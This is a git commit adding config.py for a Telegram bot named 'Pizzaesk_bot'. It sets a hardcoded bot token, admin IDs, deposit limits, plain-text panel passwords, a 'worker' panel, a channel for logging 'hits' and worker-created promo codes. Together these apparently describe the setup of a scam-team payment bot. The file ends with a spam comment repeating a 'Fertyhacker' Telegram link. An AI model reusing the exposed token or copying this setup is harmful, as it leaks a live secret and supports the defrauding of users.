d1bec21894ceb7400743ad6761731102f81d4242
t5nn8ggs6s-beep <t5nn8ggs6s@privaterelay.appleid.com>
2026-03-19 23:18:08 +0500

    Create config.py

---
+++ config.py
@@ -0,0 +1,18 @@
+TOKEN='8704053635:AAEFXu11NG78js5I0xTkxa_K91_NTGlAgEk'
+ADMINS = [8289679178]
+
+bot_username = 'Pizzaesk_bot'
+
+minimalka = 100 #мин пополнение
+maximalka = 20000 #макс пополнение
+
+vxodadmin='adminwork' #Слово для входа в админ панель (Доступно только для админов)
+vxodworker='workpan'#Слово для входа в воркер панель (Доступно только для всех)
+
+zalety = -1003881532809 #фйди канала залётов
+
+poderjka = "vpnnify" #аккаунт техподдержки без @
+
+maxpromo = 1000 #максимальная сумма промокода которую могут создать воркеры
+
+#https://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhackerhttps://t.me/Fertyhacker
